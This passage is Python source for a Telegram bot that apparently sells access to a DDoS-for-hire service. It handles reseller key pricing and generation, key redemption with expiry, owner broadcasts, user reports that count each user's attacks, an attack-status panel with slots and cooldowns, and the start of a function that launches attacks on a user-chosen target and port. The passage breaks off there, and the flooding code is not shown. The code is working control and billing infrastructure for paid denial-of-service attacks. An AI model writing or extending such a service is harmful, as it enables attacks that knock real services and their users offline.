    safe_send_message(message.chat.id, f"💰 Your Balance\n\n💵 Balance: {reseller.get('balance', 0)} Rs\n🔑 Total Keys Generated: {reseller.get('total_keys_generated', 0)}\n\n📋 Use /prices to see key prices\n🔑 Use /gen <duration> to generate key", reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["prices"])
def prices_command(message):
    if check_banned(message): return
    user_id = message.from_user.id
    
    if not is_reseller(user_id) and not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command is for resellers only!", reply_to=message)
        return
    
    update_reseller_pricing()
    
    response = "═══════════════════════════\n"
    response += "💵 KEY PRICING\n"
    response += "═══════════════════════════\n\n"
    
    durations = ['12h', '1d', '3d', '7d', '30d', '60d']
    for dur in durations:
        if dur in RESELLER_PRICING:
            info = RESELLER_PRICING[dur]
            response += f"🔴 {info['label']:<9} ➜  {info['price']} Rs\n"
            
    response += "\n═══════════════════════════\n"
    response += "📋 Usage: /gen <duration> <count>\n"
    response += "Example: /gen 1d 1\n"
    response += "═══════════════════════════"
    
    safe_send_message(message.chat.id, response, reply_to=message)

@bot.message_handler(commands=["prot_on"])
def prot_on_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    set_setting('port_protection', True)
    safe_send_message(message.chat.id, "✅ Port Spam Protection enabled!", reply_to=message)

@bot.message_handler(commands=["prot_off"])
def prot_off_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    set_setting('port_protection', False)
    safe_send_message(message.chat.id, "✅ Port Spam Protection disabled!", reply_to=message)

@bot.message_handler(commands=["trail"])
def owner_trail_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, "⚠️ Usage: /trail <duration> <count>\n\nExample: /trail 1h 10", reply_to=message)
        return
    
    duration_str = command_parts[1].lower()
    duration, duration_label = parse_duration(duration_str)
    
    if not duration:
        safe_send_message(message.chat.id, "❌ Invalid duration!", reply_to=message)
        return
    
    try:
        count = int(command_parts[2])
    except ValueError:
        safe_send_message(message.chat.id, "❌ Invalid count!", reply_to=message)
        return
    
    generated_keys = []
    for _ in range(count):
        key = f"TRAIL-OWNER-{generate_key(10)}"
        keys_db[key] = {
            'key': key,
            'duration_seconds': int(duration.total_seconds()),
            'duration_label': f"{duration_label} (Owner Trail)",
            'created_at': datetime.now(),
            'created_by': user_id,
            'created_by_type': 'owner_trail',
            'used': False,
            'used_by': None,
            'used_at': None,
            'max_users': 1,
            'is_trail': True
        }
        generated_keys.append(key)
    save_all()
    
    keys_text = "\n".join([f"• <code>{k}</code>" for k in generated_keys])
    safe_send_message(message.chat.id, f"✅ {count} Owner Trail Keys Generated!\n\n🔑 Keys:\n{keys_text}\n\n⏰ Duration: {duration_label}", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["user_resell"])
def user_resell_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /user_resell <id or @username>", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    keys = []
    for key_data in keys_db.values():
        if key_data.get('created_by') == reseller_id and key_data.get('used'):
            keys.append(key_data)
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    if not keys:
        safe_send_message(message.chat.id, f"📋 Reseller {display} has no users!", reply_to=message)
        return
    
    response = f"═══════════════════════════\n"
    response += f"👤 RESELLER {display} USERS\n"
    response += "═══════════════════════════\n\n"
    
    for i, key in enumerate(keys[:15], 1):
        for user in users_db.values():
            if user.get('key') == key['key']:
                response += f"{i}. 👤 {user.get('username', 'Unknown')}\n"
                response += f"   📱 ID: {user['user_id']}\n"
                response += f"   🔑 Key: {key['key']}\n\n"
                break
    
    response += f"═══════════════════════════\n"
    response += f"📊 Total Users: {len(keys)}\n"
    response += "═══════════════════════════"
    
    safe_send_message(message.chat.id, response, reply_to=message)

pending_broadcast = {}
pending_broadcast_reseller = {}
_broadcast_lock = threading.Lock()
pending_del_exp = {}
pending_del_exp_key = {}

@bot.message_handler(commands=["broadcast_paid"])
def broadcast_paid_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /broadcast_paid <message>", reply_to=message)
        return
    
    broadcast_msg = command_parts[1]
    
    now = datetime.now()
    active_subscribers = []
    for user in users_db.values():
        if user.get('key_expiry') and user['key_expiry'] > now:
            active_subscribers.append(user)
    
    if not active_subscribers:
        safe_send_message(message.chat.id, "📋 No active subscribers to send message to!", reply_to=message)
        return
        
    sent_count = 0
    fail_count = 0
    
    progress_msg = safe_send_message(message.chat.id, f"📢 Broadcasting message to {len(active_subscribers)} paid users...", reply_to=message)
    
    for user in active_subscribers:
        try:
            target_id = user['user_id']
            if target_id == BOT_OWNER:
                continue
            bot.send_message(target_id, f"💎 PAID USER ANNOUNCEMENT\n\n{broadcast_msg}")
            sent_count += 1
            time.sleep(0.05)
        except Exception:
            fail_count += 1
            
    try:
        bot.edit_message_text(
            f"✅ Broadcast Complete!\n\n👤 Sent to: {sent_count} paid users\n❌ Failed: {fail_count}",
            message.chat.id,
            progress_msg.message_id
        )
    except:
        safe_send_message(message.chat.id, f"✅ Broadcast Complete!\n\n👤 Sent to: {sent_count} paid users\n❌ Failed: {fail_count}", reply_to=message)

@bot.message_handler(commands=["broadcast"])
def broadcast_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    reply_msg = message.reply_to_message
    command_parts = message.text.split(maxsplit=1)
    
    if not reply_msg and len(command_parts) < 2:
        safe_send_message(message.chat.id, "⚠️ Usage:\n• /broadcast <message>\n• Or reply to a message with /broadcast", reply_to=message)
        return
    
    all_user_ids = set()
    for uid in users_db:
        all_user_ids.add(uid)
    for uid in resellers_db:
        all_user_ids.add(uid)
    for uid in bot_users_db:
        all_user_ids.add(uid)
    
    if reply_msg:
        pending_broadcast[user_id] = {'type': 'reply', 'message': reply_msg, 'users': all_user_ids}
        content_type = "Photo" if reply_msg.photo else "Video" if reply_msg.video else "Document" if reply_msg.document else "Poll" if reply_msg.poll else "Audio" if reply_msg.audio else "Sticker" if reply_msg.sticker else "Text"
        safe_send_message(message.chat.id, f"⚠️ Broadcast Confirmation\n\n📦 Content: {content_type}\n👥 Users: {len(all_user_ids)}\n\n✅ /confirm_broadcast - Send\n❌ /cancel_broadcast - Cancel", reply_to=message)
    else:
        broadcast_msg = command_parts[1]
        pending_broadcast[user_id] = {'type': 'text', 'message': broadcast_msg, 'users': all_user_ids}
        safe_send_message(message.chat.id, f"⚠️ Broadcast Confirmation\n\n📝 Message: {broadcast_msg[:100]}{'...' if len(broadcast_msg) > 100 else ''}\n👥 Users: {len(all_user_ids)}\n\n✅ /confirm_broadcast - Send\n❌ /cancel_broadcast - Cancel", reply_to=message)

@bot.message_handler(commands=["confirm_broadcast"])
def confirm_broadcast_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        return
    
    if user_id not in pending_broadcast:
        safe_send_message(message.chat.id, "❌ First use /broadcast!", reply_to=message)
        return
    
    data = pending_broadcast[user_id]
    del pending_broadcast[user_id]
    
    sent_count = 0
    failed_count = 0
    
    for uid in data['users']:
        try:
            if data['type'] == 'text':
                bot.send_message(uid, f"📢 BROADCAST\n\n{data['message']}")
            else:
                bot.copy_message(uid, data['message'].chat.id, data['message'].message_id)
            sent_count += 1
        except:
            failed_count += 1
    
    safe_send_message(message.chat.id, f"✅ Broadcast Sent!\n\n📨 Total: {len(data['users'])}\n✅ Delivered: {sent_count}\n❌ Failed: {failed_count}", reply_to=message)

@bot.message_handler(commands=["cancel_broadcast"])
def cancel_broadcast_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        return
    
    cancelled = False
    if user_id in pending_broadcast:
        del pending_broadcast[user_id]
        cancelled = True
    if user_id in pending_broadcast_reseller:
        del pending_broadcast_reseller[user_id]
        cancelled = True
    
    if cancelled:
        safe_send_message(message.chat.id, "❌ Broadcast cancelled!", reply_to=message)
    else:
        safe_send_message(message.chat.id, "ℹ️ No pending broadcast found.", reply_to=message)

@bot.message_handler(commands=["broadcast_reseller"])
def broadcast_reseller_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    reply_msg = message.reply_to_message
    command_parts = message.text.split(maxsplit=1)
    
    if not reply_msg and len(command_parts) < 2:
        safe_send_message(message.chat.id, "⚠️ Usage:\n• /broadcast_reseller <message>\n• Or reply to a message with /broadcast_reseller", reply_to=message)
        return
    
    reseller_ids = set(resellers_db.keys())
    
    if reply_msg:
        pending_broadcast_reseller[user_id] = {'type': 'reply', 'message': reply_msg, 'users': reseller_ids}
        content_type = "Photo" if reply_msg.photo else "Video" if reply_msg.video else "Document" if reply_msg.document else "Poll" if reply_msg.poll else "Audio" if reply_msg.audio else "Sticker" if reply_msg.sticker else "Text"
        safe_send_message(message.chat.id, f"⚠️ Reseller Broadcast Confirmation\n\n📦 Content: {content_type}\n👥 Resellers: {len(reseller_ids)}\n\n✅ /confirm_broadcast_reseller - Send\n❌ /cancel_broadcast - Cancel", reply_to=message)
    else:
        broadcast_msg = command_parts[1]
        pending_broadcast_reseller[user_id] = {'type': 'text', 'message': broadcast_msg, 'users': reseller_ids}
        safe_send_message(message.chat.id, f"⚠️ Reseller Broadcast Confirmation\n\n📝 Message: {broadcast_msg[:100]}{'...' if len(broadcast_msg) > 100 else ''}\n👥 Resellers: {len(reseller_ids)}\n\n✅ /confirm_broadcast_reseller - Send\n❌ /cancel_broadcast - Cancel", reply_to=message)

@bot.message_handler(commands=["confirm_broadcast_reseller"])
def confirm_broadcast_reseller_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        return
    
    if user_id not in pending_broadcast_reseller:
        safe_send_message(message.chat.id, "❌ First use /broadcast_reseller!", reply_to=message)
        return
    
    data = pending_broadcast_reseller[user_id]
    del pending_broadcast_reseller[user_id]
    
    sent_count = 0
    failed_count = 0
    
    for uid in data['users']:
        try:
            if data['type'] == 'text':
                bot.send_message(uid, f"📢 RESELLER NOTICE\n\n{data['message']}")
            else:
                bot.copy_message(uid, data['message'].chat.id, data['message'].message_id)
            sent_count += 1
        except:
            failed_count += 1
    
    safe_send_message(message.chat.id, f"✅ Reseller Broadcast Sent!\n\n📨 Total: {len(data['users'])}\n✅ Delivered: {sent_count}\n❌ Failed: {failed_count}", reply_to=message)

@bot.message_handler(commands=["redeem"])
def redeem_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /redeem <key>", reply_to=message)
        return
    
    key_input = command_parts[1]
    key_doc = keys_db.get(key_input)
    
    if not key_doc:
        safe_send_message(message.chat.id, "❌ Invalid key!", reply_to=message)
        return
    
    max_users = key_doc.get('max_users', 1)
    current_users = key_doc.get('current_users', 0)
    
    if key_doc.get('used') and current_users >= max_users:
        safe_send_message(message.chat.id, "❌ This key has already been used!", reply_to=message)
        return
    
    if key_doc.get('is_trail'):
        user_data = users_db.get(user_id)
        if user_data and user_data.get('key_expiry') and user_data['key_expiry'] > datetime.now():
            abuse_count = user_data.get('trail_abuse_count', 0) + 1
            users_db[user_id]['trail_abuse_count'] = abuse_count
            save_all()
            
            if abuse_count == 1:
                safe_send_message(message.chat.id, "⚠️ Warning: You cannot extend your time with a trail key! Another attempt may result in a ban.", reply_to=message)
            else:
                ban_minutes = 10 * (2 ** (abuse_count - 2))
                ban_expiry = datetime.now() + timedelta(minutes=ban_minutes)
                users_db[user_id]['banned'] = True
                users_db[user_id]['ban_type'] = 'temporary'
                users_db[user_id]['ban_expiry'] = ban_expiry
                save_all()
                safe_send_message(message.chat.id, f"🚫 You have been banned for {ban_minutes} minutes due to trail key abuse!", reply_to=message)
            return

    user = users_db.get(user_id)
    
    reseller_username = key_doc.get('created_by_username') if key_doc.get('created_by_type') == 'reseller' else None
    
    if user and user.get('key_expiry') and user['key_expiry'] > datetime.now():
        new_expiry = user['key_expiry'] + timedelta(seconds=key_doc['duration_seconds'])
        
        users_db[user_id] = {
            'user_id': user_id,
            'username': user_name,
            'key': key_input,
            'key_expiry': new_expiry,
            'key_duration_seconds': key_doc['duration_seconds'],
            'key_duration_label': key_doc['duration_label'],
            'redeemed_at': datetime.now(),
            'reseller_username': reseller_username
        }
        save_all()
        
        new_current = current_users + 1
        if new_current >= max_users:
            keys_db[key_input]['used'] = True
            keys_db[key_input]['used_by'] = user_id
            keys_db[key_input]['used_at'] = datetime.now()
            keys_db[key_input]['current_users'] = new_current
        else:
            keys_db[key_input]['used_at'] = datetime.now()
            keys_db[key_input]['current_users'] = new_current
        save_all()
        
        new_remaining = get_time_remaining(user_id)
        safe_send_message(message.chat.id, f"✅ Key Extended!\n\n🔑 Key: `{key_input}`\n⏰ Added: {key_doc['duration_label']}\n⏳ Total Time: {new_remaining}", reply_to=message, parse_mode="Markdown")
    else:
        expiry_time = datetime.now() + timedelta(seconds=key_doc['duration_seconds'])
        
        users_db[user_id] = {
            'user_id': user_id,
            'username': user_name,
            'key': key_input,
            'key_expiry': expiry_time,
            'key_duration_seconds': key_doc['duration_seconds'],
            'key_duration_label': key_doc['duration_label'],
            'redeemed_at': datetime.now(),
            'reseller_username': reseller_username
        }
        save_all()
        
        new_current = current_users + 1
        if new_current >= max_users:
            keys_db[key_input]['used'] = True
            keys_db[key_input]['used_by'] = user_id
            keys_db[key_input]['used_at'] = datetime.now()
            keys_db[key_input]['current_users'] = new_current
        else:
            keys_db[key_input]['used_at'] = datetime.now()
            keys_db[key_input]['current_users'] = new_current
        save_all()
        
        remaining = get_time_remaining(user_id)
        safe_send_message(message.chat.id, f"✅ Key Redeemed!\n\n🔑 Key: `{key_input}`\n⏰ Duration: {key_doc['duration_label']}\n⏳ Time Left: {remaining}", reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["mykey"])
def my_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    user = users_db.get(user_id)
    
    if not user or not user.get('key'):
        safe_send_message(message.chat.id, "❌ You don't have a key!", reply_to=message)
        return
    
    if not has_valid_key(user_id):
        reseller_username = user.get('reseller_username')
        if reseller_username:
            safe_send_message(message.chat.id, f"❌ Key expired!\n\n🔄 For renewal DM: @{reseller_username}", reply_to=message, parse_mode="Markdown")
        else:
            safe_send_message(message.chat.id, "❌ Key expired!", reply_to=message)
        return
    
    remaining = get_time_remaining(user_id)
    
    safe_send_message(message.chat.id, f"🔑 Key Details\n\n📌 Key: `{user['key']}`\n⏳ Remaining: {remaining}\n✅ Status: Active", reply_to=message, parse_mode="Markdown")

def build_status_message():
    attack_active = is_global_attack_active()
    cooldown = get_global_cooldown()
    busy_slots, free_slots, total_slots = get_slot_status()
    
    response = "╔══════════════════════════╗\n"
    response += f"║  🔥 ATTACK STATUS  🔥       ║\n"
    response += "╠══════════════════════════╣\n"
    
    if attack_active:
        remaining = int((global_attack_end_time - datetime.now()).total_seconds())
        response += f"║  ⚔️ Attack in progress     ║\n"
        response += f"║  ⏱️ Time remaining: {remaining}s   ║\n"
    else:
        response += f"║  💤 No active attack      ║\n"
    
    response += "╚══════════════════════════╝\n"
    response += "\n┌─────── SLOT STATUS ───────┐\n"
    response += f"│ 🟢 Free Slots: {free_slots}/{total_slots}\n"
    response += f"│ 🔴 Used Slots: {busy_slots}/{total_slots}\n"
    response += "└──────────────────────────┘\n"
    
    if cooldown > 0:
        response += f"\n⏳ Global Cooldown: {cooldown}s"
    
    response += f"\n⚙️ Max Time: {get_max_attack_time()}s"
    
    return response

def update_status_loop(chat_id, message_id):
    try:
        update_count = 0
        while update_count < 30:
            time.sleep(2)
            if not is_global_attack_active() and get_global_cooldown() == 0:
                break
                
            new_response = build_status_message()
            try:
                bot.edit_message_text(new_response, chat_id=chat_id, message_id=message_id)
                update_count += 1
            except Exception as e:
                error_str = str(e)
                if "message to edit not found" in error_str:
                    break
                elif "message is not modified" in error_str:
                    continue
                else:
                    print(f"Status update error: {error_str}")
                    break
    except Exception as e:
        print(f"Status loop error: {e}")
        traceback.print_exc()

@bot.message_handler(commands=["status"])
def status_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    if not has_valid_key(user_id) and not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Purchase a key first!", reply_to=message)
        return
        
    response = build_status_message()
    try:
        sent_msg = safe_send_message(message.chat.id, response, reply_to=message)
        
        if is_global_attack_active() or get_global_cooldown() > 0:
            thread = threading.Thread(target=update_status_loop, args=(sent_msg.chat.id, sent_msg.message_id))
            thread.daemon = True
            thread.start()
    except Exception as e:
        print(f"Status command error: {e}")
        safe_send_message(message.chat.id, response, reply_to=message)

@bot.message_handler(commands=["extend"])
def extend_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, "⚠️ Usage: /extend <id or @username> <time>", reply_to=message)
        return
    
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    duration_str = command_parts[2].lower()
    duration, duration_label = parse_duration(duration_str)
    
    if not duration:
        safe_send_message(message.chat.id, "❌ Invalid duration!", reply_to=message)
        return
    
    user = users_db.get(target_user_id)
    
    if not user:
        safe_send_message(message.chat.id, "❌ User not found in key database!", reply_to=message)
        return
    
    if user.get('key_expiry') and user['key_expiry'] > datetime.now():
        new_expiry = user['key_expiry'] + duration
    else:
        new_expiry = datetime.now() + duration
    
    users_db[target_user_id]['key_expiry'] = new_expiry
    save_all()
    
    new_remaining = format_timedelta(new_expiry - datetime.now())
    
    try:
        bot.send_message(target_user_id, f"🎉 Time Extended!\n\n⏰ Added: {duration_label}\n⏳ Total Time: {new_remaining}\n\nEnjoy!")
    except:
        pass
    
    display = f"@{resolved_name}" if resolved_name else str(target_user_id)
    safe_send_message(message.chat.id, f"✅ Time Extended!\n\n👤 User: {display}\n🆔 ID: {target_user_id}\n⏰ Added: {duration_label}\n⏳ New Time: {new_remaining}", reply_to=message)

@bot.message_handler(commands=["down"])
def down_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, "⚠️ Usage: /down <id or @username> <time>", reply_to=message)
        return
    
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    duration_str = command_parts[2].lower()
    duration, duration_label = parse_duration(duration_str)
    
    if not duration:
        safe_send_message(message.chat.id, "❌ Invalid duration!", reply_to=message)
        return
    
    user = users_db.get(target_user_id)
    
    if not user:
        safe_send_message(message.chat.id, "❌ User not found in key database!", reply_to=message)
        return
    
    if not user.get('key_expiry') or user['key_expiry'] <= datetime.now():
        safe_send_message(message.chat.id, "❌ User does not have an active key!", reply_to=message)
        return
    
    new_expiry = user['key_expiry'] - duration
    display = f"@{resolved_name}" if resolved_name else str(target_user_id)
    
    if new_expiry <= datetime.now():
        users_db[target_user_id]['key'] = None
        users_db[target_user_id]['key_expiry'] = None
        save_all()
        safe_send_message(message.chat.id, f"⚠️ Key Expired!\n\n👤 User: {display}\n🆔 ID: {target_user_id}\n❌ Key removed!", reply_to=message)
    else:
        users_db[target_user_id]['key_expiry'] = new_expiry
        save_all()
        new_remaining = format_timedelta(new_expiry - datetime.now())
        safe_send_message(message.chat.id, f"✅ Time Reduced!\n\n👤 User: {display}\n🆔 ID: {target_user_id}\n⏰ Reduced: {duration_label}\n⏳ New Time: {new_remaining}", reply_to=message)

@bot.message_handler(commands=["delkey"])
def delete_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /delkey <key>", reply_to=message)
        return
    
    key_input = command_parts[1]
    
    if key_input in keys_db:
        del keys_db[key_input]
        for uid, user in users_db.items():
            if user.get('key') == key_input:
                users_db[uid]['key'] = None
                users_db[uid]['key_expiry'] = None
        save_all()
        safe_send_message(message.chat.id, f"✅ Key `{key_input}` deleted!", reply_to=message, parse_mode="Markdown")
    else:
        safe_send_message(message.chat.id, "❌ Key not found!", reply_to=message)

@bot.message_handler(commands=["key"])
def key_details_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /key <key>", reply_to=message)
        return
    
    key_input = command_parts[1]
    key_doc = keys_db.get(key_input)
    
    if not key_doc:
        safe_send_message(message.chat.id, "❌ Key not found!", reply_to=message)
        return
    
    response = "═══════════════════════════\n"
    response += "🔑 KEY DETAILS\n"
    response += "═══════════════════════════\n\n"
    
    response += f"🔑 Key: {key_input}\n"
    response += f"⏰ Duration: {key_doc.get('duration_label', 'Unknown')}\n"
    response += f"⏱️ Seconds: {key_doc.get('duration_seconds', 0)}\n"
    response += f"📅 Created: {key_doc.get('created_at', 'Unknown')}\n"
    
    creator_type = key_doc.get('created_by_type', 'owner')
    if creator_type == 'reseller':
        creator = key_doc.get('created_by_username', str(key_doc.get('created_by', 'Unknown')))
        response += f"👤 Creator: {creator} (Reseller)\n"
    else:
        response += f"👤 Creator: OWNER\n"
    
    response += f"\n📊 Status: {'🔴 USED' if key_doc.get('used') else '🟢 UNUSED'}\n"
    
    if key_doc.get('used'):
        response += f"👤 Used By: {key_doc.get('used_by', 'Unknown')}\n"
        response += f"📅 Used At: {key_doc.get('used_at', 'Unknown')}\n"
        
        for user in users_db.values():
            if user.get('key') == key_input:
                response += f"\n─── USER INFO ───\n"
                response += f"👤 Username: {user.get('username', 'Unknown')}\n"
                response += f"🆔 User ID: {user.get('user_id', 'Unknown')}\n"
                
                expiry = user.get('key_expiry')
                if expiry:
                    if expiry > datetime.now():
                        remaining = format_timedelta(expiry - datetime.now())
                        response += f"⏳ Remaining: {remaining}\n"
                        response += f"✅ Status: ACTIVE\n"
                    else:
                        response += f"❌ Status: EXPIRED\n"
                break
    
    response += "\n═══════════════════════════"
    
    safe_send_message(message.chat.id, response, reply_to=message)

@bot.message_handler(commands=["allkeys"])
def list_keys_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    unused_keys = []
    used_keys = []
    for key_data in keys_db.values():
        if not key_data.get('used'):
            unused_keys.append(key_data)
        else:
            used_keys.append(key_data)
    
    content = "═══════════════════════════\n"
    content += "       ALL KEYS REPORT\n"
    content += f"    Generated: {datetime.now().strftime('%d-%m-%Y %H:%M')}\n"
    content += "═══════════════════════════\n\n"
    
    content += f"🟢 UNUSED KEYS ({len(unused_keys)})\n"
    content += "───────────────────────────\n"
    for i, key in enumerate(unused_keys[:50], 1):
        content += f"{i}. {key['key']}\n"
        content += f"   Duration: {key.get('duration_label', 'N/A')}\n"
        content += f"   Created: {key.get('created_at', 'N/A')}\n"
        if key.get('created_by_username'):
            content += f"   By: {key.get('created_by_username')}\n"
        content += "\n"
    
    content += f"\n🔴 USED KEYS ({len(used_keys)})\n"
    content += "───────────────────────────\n"
    for i, key in enumerate(used_keys[:50], 1):
        content += f"{i}. {key['key']}\n"
        content += f"   Duration: {key.get('duration_label', 'N/A')}\n"
        content += f"   Used by: {key.get('used_by', 'N/A')}\n"
        if key.get('used_at'):
            content += f"   Used at: {key['used_at'].strftime('%d-%m-%Y %H:%M')}\n"
        if key.get('created_by_username'):
            content += f"   Created by: {key.get('created_by_username')}\n"
        content += "\n"
    
    content += "\n═══════════════════════════\n"
    content += f"TOTAL: {len(unused_keys)} unused | {len(used_keys)} used\n"
    content += "═══════════════════════════"
    
    import io
    file = io.BytesIO(content.encode('utf-8'))
    file.name = f"all_keys_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    
    bot.send_document(message.chat.id, file, caption=f"📋 All Keys Report\n\n🟢 Unused: {len(unused_keys)}\n🔴 Used: {len(used_keys)}")

@bot.message_handler(commands=["allusers"])
def all_users_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    active_users = []
    expired_users = []
    
    for user in users_db.values():
        if user.get('key_expiry') and user['key_expiry'] > datetime.now():
            active_users.append(user)
        else:
            expired_users.append(user)
    
    content = "═══════════════════════════\n"
    content += "       ALL USERS REPORT\n"
    content += f"    Generated: {datetime.now().strftime('%d-%m-%Y %H:%M')}\n"
    content += "═══════════════════════════\n\n"
    
    content += f"🟢 ACTIVE USERS ({len(active_users)})\n"
    content += "───────────────────────────\n"
    
    for i, user in enumerate(active_users[:50], 1):
        remaining = user['key_expiry'] - datetime.now()
        days = remaining.days
        hours, remainder = divmod(remaining.seconds, 3600)
        minutes, _ = divmod(remainder, 60)
        time_str = f"{days}d {hours}h {minutes}m"
        
        attack_count = 0
        for log in attack_logs_db:
            if log.get('user_id') == user['user_id']:
                attack_count += 1
        
        content += f"{i}. {user.get('username', 'Unknown')}\n"
        content += f"   ID: {user['user_id']}\n"
        content += f"   Key: {user.get('key', 'N/A')}\n"
        content += f"   Duration: {user.get('key_duration_label', 'N/A')}\n"
        content += f"   Time Left: {time_str}\n"
        content += f"   Expires: {user['key_expiry'].strftime('%d-%m-%Y %H:%M')}\n"
        content += f"   Total Attacks: {attack_count}\n"
        if user.get('reseller_username'):
            content += f"   Reseller: @{user['reseller_username']}\n"
        content += "\n"
    
    content += f"\n🔴 EXPIRED USERS ({len(expired_users)})\n"
    content += "───────────────────────────\n"
    
    for i, user in enumerate(expired_users[:50], 1):
        attack_count = 0
        for log in attack_logs_db:
            if log.get('user_id') == user['user_id']:
                attack_count += 1
        content += f"{i}. {user.get('username', 'Unknown')}\n"
        content += f"   ID: {user['user_id']}\n"
        content += f"   Key: {user.get('key', 'N/A')}\n"
        if user.get('key_expiry'):
            content += f"   Expired: {user['key_expiry'].strftime('%d-%m-%Y %H:%M')}\n"
        content += f"   Total Attacks: {attack_count}\n"
        content += "\n"
    
    content += "\n═══════════════════════════\n"
    content += f"TOTAL: {len(active_users)} Active | {len(expired_users)} Expired\n"
    content += "═══════════════════════════"
    
    import io
    file = io.BytesIO(content.encode('utf-8'))
    file.name = f"all_users_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    
    bot.send_document(message.chat.id, file, caption=f"👥 All Users Report\n\n🟢 Active: {len(active_users)}\n🔴 Expired: {len(expired_users)}")

@bot.message_handler(commands=["confirm_del_exp"])
def confirm_del_exp_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        return
    
    if user_id not in pending_del_exp:
        safe_send_message(message.chat.id, "❌ First use /del_exp_usr!", reply_to=message)
        return
    
    expired_users = pending_del_exp[user_id]
    del pending_del_exp[user_id]
    
    deleted_count = 0
    for user in expired_users:
        if user['user_id'] in users_db:
            del users_db[user['user_id']]
            deleted_count += 1
    save_all()
    
    safe_send_message(message.chat.id, f"✅ {deleted_count} expired users deleted!", reply_to=message)

@bot.message_handler(commands=["cancel_del"])
def cancel_del_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        return
    
    cancelled = False
    if user_id in pending_del_exp:
        del pending_del_exp[user_id]
        cancelled = True
    if user_id in pending_del_exp_key:
        del pending_del_exp_key[user_id]
        cancelled = True
    
    if cancelled:
        safe_send_message(message.chat.id, "❌ Delete operation cancelled!", reply_to=message)
    else:
        safe_send_message(message.chat.id, "ℹ️ No pending delete operation found.", reply_to=message)

@bot.message_handler(commands=["confirm_del_exp_key"])
def confirm_del_exp_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        return
    
    if user_id not in pending_del_exp_key:
        safe_send_message(message.chat.id, "❌ First use /del_exp_key!", reply_to=message)
        return
    
    expired_keys = pending_del_exp_key[user_id]
    del pending_del_exp_key[user_id]
    
    deleted_count = 0
    for key in expired_keys:
        if key['key'] in keys_db:
            del keys_db[key['key']]
            deleted_count += 1
    save_all()
    
    safe_send_message(message.chat.id, f"✅ {deleted_count} expired keys deleted!", reply_to=message)

def start_attack(target, port, duration, message, attack_id, api_index):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or message.from_user.first_name or str(user_id)
        
        log_attack(user_id, username, target, port, duration)
        
        cooldown = get_user_cooldown_setting()
        attack_msg = build_attack_start_message(target, port, duration, cooldown)
